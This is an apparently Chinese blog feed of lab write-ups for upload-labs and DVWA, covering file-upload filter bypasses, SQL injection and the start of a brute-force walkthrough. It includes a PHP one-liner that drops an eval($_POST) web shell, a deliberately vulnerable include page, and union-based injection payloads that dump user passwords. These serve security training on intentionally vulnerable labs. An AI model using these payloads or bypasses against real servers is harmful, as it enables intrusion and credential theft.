-&gt; .txt</span><br><span class="line">text&#x2F;html -&gt; .html</span><br><span class="line">video&#x2F;mp4 -&gt; .mp4</span><br></pre></td></tr></table></figure><p>查看源码：</p><p><img src="/2021/01/24/upload/7.jpg" alt="7"></p><p>本关类型是image/jpeg、image/png、image/gif中的任何一种就允许上传，否则就提示文件类型不正确。当上传一个PHP时，MIME类型不符合服务器端的要求，上传就会失败。pass-01中先改文件后缀名通过js校验再抓包更改后缀上传至服务器的方法一样可行。</p><p>另一种方法是改MIME类型：</p><p>上传PHP，抓包将MIME类型改为服务器允许的，原理是绕过了服务器端对MIME的检测并成功将shell上传。</p><p><img src="/2021/01/24/upload/8.jpg" alt="8"></p><h1 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03(黑名单绕过)"></a>Pass-03(黑名单绕过)</h1><p>查看提示：</p><img src="/2021/01/24/upload/9.jpg" alt="9" style="zoom:50%;"><p>本关属于黑名单验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">黑名单过滤的缺点：</span><br><span class="line">    攻击者可以从黑名单中找到Web开发者忽略的扩展名</span><br><span class="line">    没有进行大小写转换，诸如.PHP扩展名不在黑名单里，依旧会被服务器接收</span><br><span class="line">    windows系统下，如果文件名以&quot;.&quot;或空格结尾会自动取出。asp.转化为asp</span><br></pre></td></tr></table></figure><p>本关将常用脚本语言的shell文件后缀全部禁止，Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置，规定哪些文件后缀是以php格式来解析的。本关的解法就从这得来，尝试用php3,phtml绕过：</p><p>一样先抓包，改后缀名，本关上传一句话木马，因为通过这种方式上传的文件服务器会修改文件名，故蚁剑连接时文件名记得换。</p><h1 id="Pass-04-黑名单绕过-htaccess"><a href="#Pass-04-黑名单绕过-htaccess" class="headerlink" title="Pass-04(黑名单绕过-.htaccess)"></a>Pass-04(黑名单绕过-.htaccess)</h1><p>查看提示黑名单有点多，但是漏掉了Apache服务器的一个配置文件.htaccess。所以这关的思路就是<strong>先上传一个htaccess文件，写入规则让服务器把指定的文件格式按照php的格式解析。然后就上传指定文件格式的文件（不在黑名单中的）进行测试。</strong></p><p>文件要写入：SetHandler application/x-httpd-php(让Apache对当前目录中的所有文件都以php的格式进行解析).上传，抓包:</p><p><img src="/2021/01/24/upload/10.jpg" alt="10"></p><p>再将shell改一下拓展名，上传即可。</p><h1 id="Pass-05（黑名单验证，-user-ini-）"><a href="#Pass-05（黑名单验证，-user-ini-）" class="headerlink" title="Pass-05（黑名单验证，.user.ini.）"></a>Pass-05（黑名单验证，.user.ini.）</h1><p><img src="/2021/01/24/upload/11.jpg" alt="11"></p><p>本关可以利用ini配置文件进行上传，先上传以<code>auto_prepend_file=1.jpg</code>为内容的<code>.user.ini</code>文件（<strong>所有的php文件都自动包含1.jpg文件。.user.ini相当于一个用户自定义的php.ini</strong>）然后再上传一句话的脚本，命名为<code>1.jpg</code>。访问即可。</p><h1 id="Pass-06-黑名单验证-大小写绕过"><a href="#Pass-06-黑名单验证-大小写绕过" class="headerlink" title="Pass-06(黑名单验证-大小写绕过)"></a>Pass-06(黑名单验证-大小写绕过)</h1><p>查看源代码可知无大小写转换，将文件名后缀直接改成Php,大小写混合的格式即可。</p><h1 id="Pass-07-黑名单验证–空格绕过"><a href="#Pass-07-黑名单验证–空格绕过" class="headerlink" title="Pass-07(黑名单验证–空格绕过)"></a>Pass-07(<strong>黑名单验证–空格绕过</strong>)</h1><p>从源码中可以看到，服务器端对文件后缀名仅仅是进行了去除末尾的”.”以及小写转换操作。但是并没有进行去除空格的操作,(<strong>windows系统中会将文件扩展名后的空格做空处理，防止文件被当成另一种不可识别的文件类型。故可利用这个特性来绕过这一关的黑名单</strong>)直接上传，抓包，加空格，访问。</p><h1 id="Pass-08（黑名单验证–点号绕过）"><a href="#Pass-08（黑名单验证–点号绕过）" class="headerlink" title="Pass-08（黑名单验证–点号绕过）"></a>Pass-08（黑名单验证–点号绕过）</h1><p>观察代码，没有进行点号去除(<strong>windows系统对于文件后缀名后面跟的”.”会自动去除，不管是添加一个还是多个效果都是一样的</strong>)，利用此点，抓包，加点。</p><h1 id="Pass-09-黑名单验证–特殊字符-DATA绕过"><a href="#Pass-09-黑名单验证–特殊字符-DATA绕过" class="headerlink" title="Pass-09(黑名单验证–特殊字符::$DATA绕过)"></a>Pass-09(黑名单验证–特殊字符::$DATA绕过)</h1><p>代码少了对<code>::$DATA</code>的处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATA(NTFS文件系统的存储数据流的一个属性)NTFS文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：$DATA,当我们访问1.php::$DATA 时，就是请求 1.php 本身的数据，如果a.php 还包含了其他的数据流，比如a.php:lake2.php，请求1.php:lake2.php::$DATA，则是请求1.php中的流数据lake2.php的流数据内容。</span><br></pre></td></tr></table></figure><p>故本关可解：抓包，改后缀(加上::$DATA)，访问(<strong>服务器端会对文件进行重命名,且文件为正常的php文件，故一样可用蚁剑连接</strong>)</p><h1 id="Pass-10（黑名单-单次处理）"><a href="#Pass-10（黑名单-单次处理）" class="headerlink" title="Pass-10（黑名单-单次处理）"></a>Pass-10（黑名单-单次处理）</h1><p>从源代码看，貌似前几关的漏洞都没有了，观察代码：</p><p><img src="/2021/01/24/upload/12.jpg" alt="12"></p><p>进行了一次删除<code>.</code>的操作就直接拼接到了上传目录的后面</p><p><img src="/2021/01/24/upload/13.jpg" alt="13"></p><p>而前面几关都是做完所有的防绕过处理之后得到的文件名进行拼接的。所以我们只需构造一个<strong>经过所有的防绕过操作之后不在黑名单中，并且经过去除末尾”.”号之后拼接还能被解析的后缀</strong>，故本关可在文件后缀加上<code>. .</code>一个点应付一次去点，一个空格应付一个去空格，这样就可以了</p><h1 id="Pass-11（黑名单-双写绕过"><a href="#Pass-11（黑名单-双写绕过" class="headerlink" title="Pass-11（黑名单-双写绕过)"></a>Pass-11（黑名单-双写绕过)</h1><p>本关的关键在str_ireplace（）函数</p><p>语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_ireplace(find,replace,string,count)</span><br></pre></td></tr></table></figure><p>此函数用于替换字符串中的一些字符（不区分大小写），比如本关源代码中<code>str_ireplace($deny_ext,&quot;&quot;, $file_name)</code>便是将<strong>文件名中含有黑名单字符串的那一部分替换为空</strong>，具体用法：<a href="https://www.w3school.com.cn/php/func_string_str_ireplace.asp">str_irplace函数</a></p><p>利用此特性便可构造<code>.pphphp</code>后缀，当匹配到第一个p时不满足，匹配到第二个就能匹配到php且被去除，这里在匹配完成之后就不会对剩下的继续进行匹配了，因此剩下的p和hp自然就组合为了php。完美绕过str_ireplace（）函数的过滤。</p><h1 id="Pass-12（白名单-0x00截断-GET型"><a href="#Pass-12（白名单-0x00截断-GET型" class="headerlink" title="Pass-12（白名单-0x00截断-GET型)"></a>Pass-12（白名单-0x00截断-GET型)</h1><p>提示里说上传路径可控，查看源码，判断为白名单验证，但是路径可控是什么意思?</p><p>截断原理：chr()是一个用来返回参数所对应的字符的函数，故chr（）表示空，<strong>当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生</strong>，与之相关还有一个知识点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00是对ascii码中的0对应的字符编码后的结果，0x00则是%00解码成的16进制。当url中的参数是通过GET方式获取时，%00会被自动解码。当通过POST方式获取时，不会自动解码，%00只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它的十六进制改写为0x00。 </span><br></pre></td></tr></table></figure><p>截断还需满足 </p><ul><li>php 版本&lt;5.3.4 </li><li>php.ini中的magic_quotes_gpc是off状态(<strong>当magic_quotes_gpc开启时，所有的 单引号，双引号，反斜线和 NULL字符（%00）都会被自动加上一个反斜杠进行转义</strong>)</li></ul><p>上传，抓包，做如下修改：</p><p><img src="/2021/01/24/upload/14.jpg" alt="14"></p><h1 id="Pass-13（白名单-0x00截断-POST型"><a href="#Pass-13（白名单-0x00截断-POST型" class="headerlink" title="Pass-13（白名单-0x00截断-POST型)"></a>Pass-13（白名单-0x00截断-POST型)</h1><p>本关与上一关相似，上一关为GET方式本关为POST方式，前面讲了POST和GET的区别，故本关只需在上一关的基础上，将hex中空格的值由0d改成00即可</p><h1 id="Pass-14（白名单-图片马"><a href="#Pass-14（白名单-图片马" class="headerlink" title="Pass-14（白名单-图片马)"></a>Pass-14（白名单-图片马)</h1><p>提示说本关检查图标内容开头2个字节，查看源码，源码只检测文件头部2个字节信息，那它怎么知道文件类型？查阅资料发现，一般的文件前两个字节信息都能表明自己文件类型（用winhex察看图片的文件头）例如：</p><table><thead><tr><th>type</th><th>ExtensionsHeader</th></tr></thead><tbody><tr><td>jpeg</td><td>0xFFD8FF</td></tr><tr><td>png</td><td>0x89504E470D0A1A0A</td></tr><tr><td>gif</td><td>GIF8</td></tr><tr><td>tiff</td><td>0x49492A00 or 0x4D4D002A</td></tr><tr><td>Bit   map</td><td>BM</td></tr><tr><td>PC Paintbrush</td><td>0x0A050108</td></tr><tr><td>AOL ART</td><td>0x4A47040E000000 or 0x4A47030E000000</td></tr></tbody></table><p>本关所说的图片马就是把一张正常的图片和一个shell文件合在一起形成一个新的文件，可以把新的文件定义成图片。</p><p><img src="/2021/01/24/upload/15.jpg" alt="15"></p><p>上图为cmd方法制图片马。格式：<code>copy 1.jpg/b+1.php 2.jpg </code>（参数/b指定以二进制格式复制、合并文件(图片)，参数/a指定以ASCI1格式复制、合并文件( php文件)）.</p><p>但是一张图片不能被解析成php执行，故图片马不能直接上传。但是本关任务中第二点提到了使用<a href="http://127.0.0.1/upload-labs/include.php">文件包含漏洞</a>能运行图片马中的恶意代码。故我们可以新建一个文件包含漏洞页面来模拟真实环境。</p><p>在上传目录中新建一个include.php文件，写入如下代码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ] ;</span><br><span class="line"><span class="keyword">include</span> ($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>再用蚁剑连接</p><p><img src="/2021/01/24/upload/16.jpg" alt="16"></p><h1 id="Pass-15-白名单-图片马-getimagesize"><a href="#Pass-15-白名单-图片马-getimagesize" class="headerlink" title="Pass-15(白名单-图片马-getimagesize())"></a>Pass-15(白名单-图片马-getimagesize())</h1><p>了解一下提示中提到的<code>getimagesize()</code>函数:</p><p>获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。语法格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array getimagesize ( string $filename [, array &amp;$imageinfo ] )</span><br></pre></td></tr></table></figure><p><code>getimagesize() </code>函数将测定任何 <code>GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP</code> 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。详情：<a href="https://www.runoob.com/php/php-getimagesize.html">getimagesize()函数</a></p><p>接下来在目录里创建一个php文件来测试该函数返回数组的各个值的含义。代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$local_jpg &#x3D;&#39;.&#x2F;00.jpg&#39;;</span><br><span class="line">$img_data &#x3D; getimagesize($local_jpg);&#x2F;&#x2F;getimagesize()函数对本地图片00.jpg进行检查</span><br><span class="line">var_dump($img_data );&#x2F;&#x2F;打印检查结果的数组</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行：</p><p><img src="/2021/01/24/upload/17.jpg" alt="17"></p><p>索引的含义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">索引0 &gt;&gt;图像宽度的像素值</span><br><span class="line"></span><br><span class="line">索引1 &gt;&gt;图像高度的像素值</span><br><span class="line"></span><br><span class="line">索引2 &gt;&gt;图像的类型，1 &#x3D; GIF，2 &#x3D; JPG，3 &#x3D; PNG，4 &#x3D; SWF，5 &#x3D; PSD，6 &#x3D; BMP，7 &#x3D; TIFF(intel byte order)，8 &#x3D; TIFF(motorola byte order)，9 &#x3D; JPC，10 &#x3D; JP2，11 &#x3D; JPX，12 &#x3D; JB2，13 &#x3D; SWC，14 &#x3D; IFF，15 &#x3D; WBMP，16 &#x3D; XBM</span><br><span class="line"></span><br><span class="line">索引3 &gt;&gt;一个宽度和高度的字符串</span><br><span class="line"></span><br><span class="line">索引 bits &gt;&gt;图像的每种颜色的位数，二进制格式</span><br><span class="line"></span><br><span class="line">索引 channels &gt;&gt;图像的通道值&#x2F;&#x2F;本次测试没有</span><br><span class="line"></span><br><span class="line">索引 mime &gt;&gt;图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息</span><br></pre></td></tr></table></figure><p>源代码:</p><p><img src="/2021/01/24/upload/18.jpg" alt="18"></p><p>并未做其它更多的过滤操作，所以上一关的图片马依然可用。</p><h1 id="Pass-16-白名单-图片马-exif-imagetype"><a href="#Pass-16-白名单-图片马-exif-imagetype" class="headerlink" title="Pass-16(白名单-图片马-exif_imagetype())"></a>Pass-16(白名单-图片马-exif_imagetype())</h1><p>提示中换了一个函数：exif_imagetype()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读取一个图像的第一个字节并检查其签名，恰当的签名则返回一个对应的常量，否则返回 FALSE。返回值跟getimagesize() 返回的数组中的索引 2 的值是一样的(pass-15中讲的)</span><br></pre></td></tr></table></figure><p>语法格式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exif_imagetype ( string $filename&#x2F;&#x2F;文件位置和名称)</span><br></pre></td></tr></table></figure><p>一样写个测试文件进行测试</p><p><img src="/2021/01/24/upload/19.jpg" alt="19"></p><p>函数貌似未定义，查找资料发现面板里的拓张没开</p><p><img src="/2021/01/24/upload/20.jpg" alt="20"></p><p>php.ini中extension=php_exif.dll前面的分号要去掉。在测试返回值为3，只检查了签名，图片马依旧可以。</p><h1 id="Pass-17-白名单-图片马-二次渲染"><a href="#Pass-17-白名单-图片马-二次渲染" class="headerlink" title="Pass-17(白名单-图片马-二次渲染)"></a>Pass-17(白名单-图片马-二次渲染)</h1><p>提示说渲染了图片？查看源码，使用了imagecreatefrom 系列函数来获取原文件的数据并创建一个新的图像文件，再重命名。 </p><p><code>imagecreatefromgif()</code>：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像 <code>imagecreatefromjpeg()</code>，<code>imagecreatefrompng()</code>等同理，这样看来图片渲染好像只是换了一个名字而已.</p><p>先用GIF试，先合成一个GIF的图片马，上传，访问</p><img src="/2021/01/24/upload/21.jpg" alt="21" style="zoom: 50%;"><p>额…小场面..不慌。上传成功却不能访问??需要去对比两个gif</p><p><img src="/2021/01/24/upload/22.jpg" alt="22"></p><p><img src="/2021/01/24/upload/23.jpg" alt="23"></p><p>发现服务器上文件末尾的php代码不见了，这应该就是渲染的作用。我们的目的是让服务器中的文件依然保存我们想要执行的代码，就需要去找渲染前后没有变化的位置，然后将php代码写进去(注意要将代码转化为对应进制编译器的进制数再写入),再上传就可以啦，不截图了。</p><p>但是本关的要求是图片马要<code>.jpg</code>,<code>.png</code>,<code>.gif</code>三种后缀都上传成功才算过关！png就不是这样了，要实现png二次渲染的绕过就需要深入了解png的格式。此部分再另一文章《二次渲染&amp;&amp;png结构分析》说明。</p><h1 id="Pass-18（白名单-条件竞争-时间"><a href="#Pass-18（白名单-条件竞争-时间" class="headerlink" title="Pass-18（白名单-条件竞争-时间)"></a>Pass-18（白名单-条件竞争-时间)</h1><p>提示说要代码审计，查看源码，源码解释得很清楚，先将上传的文件保存，然后将文件的后缀名同白名单对比，符合就将文件进行重命名。不符，unlink()函数就会删除该文件，虽然上传会被删除，但如果我们能在上传的一句话被删除之前访问就可以了。这个方法也叫条件竞争上传绕过。可以利用burp多线程发包，然后不断在浏览器访问代码，会有一瞬间的访问成功，通过burp一直不停的重放，会有一瞬间是还没来得及删除就可以被访问到的，一旦访问到该文件就会在当前目录下生成一句话。</p><p>上传的一句话：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="comment">//若访问到文件则在根目录里生成shell.php文件&#x27;<span class="meta">&lt;?php</span> @eval($_POST[&quot;test&quot;])<span class="meta">?&gt;</span>&#x27;);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>先上传，抓包，设置Null payloads也就是不设置payload。设置Continue indefinitely无限重放。</p><img src="/2021/01/24/upload/24.jpg" alt="24" style="zoom:50%;"><p>根目录出现shell.php,连接蚁剑</p><img src="/2021/01/24/upload/25.jpg" alt="25" style="zoom:50%;"><p>成功~~</p><h1 id="Pass-19（白名单-条件竞争-图片马"><a href="#Pass-19（白名单-条件竞争-图片马" class="headerlink" title="Pass-19（白名单-条件竞争-图片马)"></a>Pass-19（白名单-条件竞争-图片马)</h1><p>一样是代码审计，依次检查文件是否存在、文件名是否可写、检查后缀（白名单）、检查文件大小、检查临时文件存在、保存到临时目录里、然后再重命名。与Pass-18存在同样的条件竞争。不过这里先检查了后缀，所以要上传符合白名单里的文件才可以，只能用图片马了，而且需要在图片马没有被重命名之前访问它。本关可以沿用上一关的一句话木马，再用相同手段进行不断重放，也可以借助脚本进行不断访问。但这里还有一个有趣的解法：也可将php文件后缀名更改为.php.7z，因为白名单中允许上传.7z的文件，但是apache又不能解析这个格式而会把该文件当php的格式解析。</p><h1 id="Pass-20（黑名单验证-点号绕过……"><a href="#Pass-20（黑名单验证-点号绕过……" class="headerlink" title="Pass-20（黑名单验证-点号绕过……)"></a>Pass-20（黑名单验证-点号绕过……)</h1><p>查看代码</p><p><img src="/2021/01/24/upload/26.jpg" alt="26"></p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>因为黑名单都是小写的形式，故可上传一个一句话木马然后将其命名为PHP形式后缀即可绕过</p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>在<code>save_name</code>参数中文件名称后面加空格绕过</p><h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>还可以通过<code>save_name</code>参数来进行00截断，</p><p><img src="/2021/01/24/upload/27.jpg" alt="27"></p><h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p>利用<code>pathinfo</code>函数</p><p>格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pathinfo(path,options)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">path</td><td>必需。规定要检查的路径。</td></tr><tr><td align="center">process_sections</td><td>可选。规定要返回的数组元素。默认是 all。 可能的值：                  <code>PATHINFO_DIRNAME</code> //目录- 只返回<code>dirname   </code>                                                <code>PATHINFO_BASENAME</code> //文件加后缀名- 只返回 <code>basename  </code>                                  <code>PATHINFO_EXTENSION </code>//后缀名- 只返回 <code>extension </code></td></tr></tbody></table><p>和Pass-13类似，不过本关为黑名单，在文件保存的时候，加上<code>.</code>使得<code>pathinfo()</code>获取到的<code>PATHINFO_EXTENSION</code>为空，从而绕过黑名单。</p><h1 id="Pass-21（白名单验证-数组绕过"><a href="#Pass-21（白名单验证-数组绕过" class="headerlink" title="Pass-21（白名单验证-数组绕过)"></a>Pass-21（白名单验证-数组绕过)</h1><p>先检查MIME类型(改<code>Content-Type</code>)，然后判断<code>save_name</code>参数是否为空，为空就把文件名称赋值给<code>$file</code>,否则将<code>save_name</code>参数的值赋给它。然后判断<code>$file</code>是否是数组.不是就用<code>explode()</code>函数通过<code>.</code>号分割成数组,取最后一个后缀名，进行白名单验证。不符合就报错，符合就拼接数组的第一个和最后一个作为文件名，保存。</p><p><code>explode()</code> 函数把字符串打散为数组。详情：<a href="https://www.w3school.com.cn/php/func_string_explode.asp">explode()</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reset(array &amp;$array)&#x2F;&#x2F;将数组的内部指针指向第一个单元</span><br></pre></td></tr></table></figure><p>绕过<code>explode()</code>函数：传入数组，绕过白名单，由于取的是数组最后一个，所以传入数组的最后一个要为<code>jpg|png|gif</code>，然后拼接文件名，取<code>reset()</code>第一个，即索引为0，和索引<code>count()-1</code>（数组内元素个数-1）。所以索引0应为<code>.php</code>，索引3为<code>jpg</code>（索引1之后即可），这样数组元素个数为2，拼接的就是索引0和索引1即<code>.php</code>和空，结果还是<code>.php</code></p><img src="/2021/01/24/upload/29.jpg" alt="29" style="zoom:67%;"><p>成功~~</p><img src="/2021/01/24/upload/28.jpg" alt="28" style="zoom:33%;"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>upload-labs</strong>靶场提供了许多绕过方式，但都较为简单的，实战中会遇到更复杂的绕过方式，有可能是多种验证并存，故思路不能局限，争取一关多解，其实这个靶场跟sqli-labs有相似之处，都是先逐个介绍各种验证方式，再逐步综合到一个关卡里。但解题过程把提示，源代码看得差不多了.……还过分依赖通关手册……要反思！！靶场还是很好玩的~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||SQL注入</title>
    <link href="/2021/01/22/dvwa/"/>
    <url>/2021/01/22/dvwa/</url>
    
    <content type="html"><![CDATA[<h1 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h1><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><p>先挑熟悉的sql注入下手，单引号注入,报错：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;admin&#39;&#39;&#39; at line 1</code>推测为单引号注入，查看源代码:</p><p><img src="/2021/01/22/dvwa/3.jpg" alt="3"></p><p>确定为单引号注入，源代码中用了<code>$_REQUEST获取id参数，$_REQUEST 包含了 $_GET，$_POST 和 $_COOKIE </code>的数组，没有进行过滤，开始查字段：</p><p><code>1&#39; order by 2#</code>回显正常:</p><p><img src="/2021/01/22/dvwa/4.jpg" alt="4"></p><p><code> 1&#39; order by 3#</code>显示<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code>故有两个字段，接下来查回显位置<code>1&#39; union select 1,2# </code>:</p><p><img src="/2021/01/22/dvwa/2.jpg" alt="2"></p><p>有两个显示位。</p><p>查数据库:</p><p><code>1&#39; union select 1,database()#</code></p><p><img src="/2021/01/22/dvwa/5.jpg" alt="5"></p><p>查表:</p><p><code>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>回显：<code>Illegal mix of collations for operation &#39;UNION&#39;</code>,百度的说法是字符集及数据表字段编码字符不一致导致的，不是很懂这条语句有什么编码问题，试试改为16进制读取：</p><p><code>1&#39; union select 1,hex (group_concat(table_name) )from information_schema.tables where table_schema=database() #</code></p><p><img src="/2021/01/22/dvwa/6.jpg" alt="6"></p><p><code>6775657374626F6F6B2C7573657273</code>hex解码后就是<code>guestbook,users</code></p><p>查列：</p><p><code>1&#39; union select 1,hex(group_concat(column_name)) from information_schema.columns where table_name=&#39;users&#39; #</code></p><p><img src="/2021/01/22/dvwa/7.jpg" alt="7"></p><p>hex解码后为:<code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code></p><p>查数据:</p><p><code>1&#39; union select user,password from users#</code>or<code>1&#39; union select 1,group_concat(user,0x3a,password) from users#</code>都可以</p><p><img src="/2021/01/22/dvwa/1.jpg" alt="1"></p><h4 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h4><p><img src="/2021/01/22/dvwa/8.jpg" alt="8"></p><p>一打开就这样???去百度各种查，换PHP版本，改图示路径的代码……各种方法都试了，还是这个页面，又不想删掉重搭，然后就去虚拟机搭,虚拟机还不会用，搭个靶场搭了2小时……9(主要是找不到在虚拟机上用小皮面板搭dvwa的教程)各种报错，经历各种曲折终于搭好了</p><p><img src="/2021/01/22/dvwa/9.jpg" alt="9"></p><p>本关不能输入语句，查看源码，是POST提交，且使用<code>mysqli_real_escape_string()</code>(前两个靶场碰到很多次了，不再介绍)过滤,本关是POST方法提交表单故可以抓包修改参数。步骤不再赘述，要注意<strong>单引号会被转义，遇到union语句有单引号的可利用进制转换进行绕过</strong>。</p><h4 id="high"><a href="#high" class="headerlink" title="high"></a>high</h4><p>打开是一个链接，点开跳转到一个session页面，查看源码并没有什么过滤</p><img src="/2021/01/22/dvwa/10.jpg" alt="10" style="zoom:50%;"><p>high源码中，在session输入的id也不做处理，就相当于low的sql……</p><h4 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h4><p>查看源码</p><p><img src="/2021/01/22/dvwa/11.jpg" alt="11"></p><p>防止CSRF攻击</p><pre><code class="hljs pgsql">CSRF：跨站点请求伪造。CSRF攻击者在用户登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。CSRF攻击是源于Web的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。应对CSRF的方法：    尽量使用POST，限制<span class="hljs-keyword">GET</span>    浏览器Cookie策略    加验证码    Referer <span class="hljs-keyword">Check</span>     Anti CSRF Token</code></pre><p>本关采用最后一种，至于<code>token</code>,在暴力破解的impossible等级我详细介绍过了。PS：貌似全面一点的防御都会用到<code>token</code></p><p>Token一般用在两个地方:</p><ul><li>防止表单重复提交：服务器端第一次验证相同过后,Token值会更新。若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。</li><li>anti csrf攻击（跨站点请求伪造）：服务器端会对Token值进行验证，判断是否和session中的Token值相等。若相等，则可以证明请求有效，不是伪造的。</li></ul><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( <span class="hljs-variable">$data</span>-&gt;rowCount()</span></span> == <span class="hljs-number">1</span> ) <span class="hljs-comment">//限制了只允许返回一条数据</span></code></pre><p><img src="/2021/01/22/dvwa/12.jpg" alt="12"></p><p>PDO可以防止sql注入</p><ul><li>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。对于复杂的查询，此过程要花费较长的时间，如果需要以不同参数多次重复相同的查询，那么该过程将大大降低应用程序的速度。通过使用预处理语句，可以避免重复分析/编译/优化周 期。简言之，预处理语句占用更少的资源，因而运行得更快。</li><li>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生SQL 注入。（然而，如果查询的其他部分是由未转义的输入来构建的，则仍存在 SQL 注入的风险）。</li></ul><p>详情见：<a href="https://www.cnblogs.com/leezhxing/p/5282437.html">PDO防SQL注入原理分析</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Brute Force</title>
    <link href="/2020/12/26/dvwa%E4%BA%8C/"/>
    <url>/2020/12/26/dvwa%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h1><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><h4 id="low"><a href="#low" class="headerlink" title="low"></a>low</h4><h3 id="暴力破解，查看源代码："><a href="#暴力破解，查看源代码：" class="headerlink" title="暴力破解，查看源代码："></a>暴力破解，查看源代码：</h3><p><img src="/2020/12/26/dvwa%E4%BA%8C/2.jpg" alt="2"></p><p>它的select语句没有什么过滤，可以尝试sql注入构造<code>admin&#39;#</code>密码为空：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/3.jpg" alt="3"></p><p>成功~~但这关标题为暴力破解，所以要按暴力破解做一遍：</p><p>抓包,发到intruder,先clear ，选中要爆破字段,添加：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/1.jpg" alt="1"></p><p>在payload中选择字典，读取（字典很大读取了好久）：</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/5.jpg" alt="5"></p><p>可设置线程数也可以使用默认：</p><p><img 